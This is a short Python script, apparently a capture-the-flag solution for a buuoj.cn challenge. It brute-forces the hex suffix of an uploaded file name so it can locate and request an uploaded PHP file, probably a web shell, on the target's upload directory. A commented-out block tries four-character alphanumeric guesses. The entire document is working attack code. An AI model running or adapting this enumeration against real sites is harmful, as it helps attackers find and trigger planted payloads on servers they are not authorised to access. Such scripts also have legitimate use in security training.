import requests
import string


url = 'http://a7980ec5-44e6-4766-81f9-89cbca678049.node3.buuoj.cn/Public//Uploads/2020-07-13/5f0c7650a{}.php'
                                                                                           # 5f0c7650a2d8c.jpg

range_string = string.digits+string.ascii_lowercase

print(range_string)

for a in range(0x2d8c,0xffff):
    url_1 = url.format(str(hex(a)[2:]))
    print(url_1)
    r = requests.get(url=url_1)
    if r.status_code != 404:
        print(r.text)
        print("\r\n结束！url为：")
        print(url_1)
        break
    elif r.status_code == 404:
        print(r.url)

# for a in range_string:
#     for b in range_string:
#         for c in range_string:
#             for d in range_string:
#                 url_1 = url.format(str(a)+str(b)+str(c)+str(d))
#                 r = requests.get(url=url_1)
#                 if r.status_code != 404:
#                     print(r.text)
#                     print("\r\n结束！url为：")
#                     print(url_1)
#                     break
#                 elif r.status_code == 404:
#                     print(r.url)

# r = requests.get(url=url.format('1'))
# print(r.status_code)
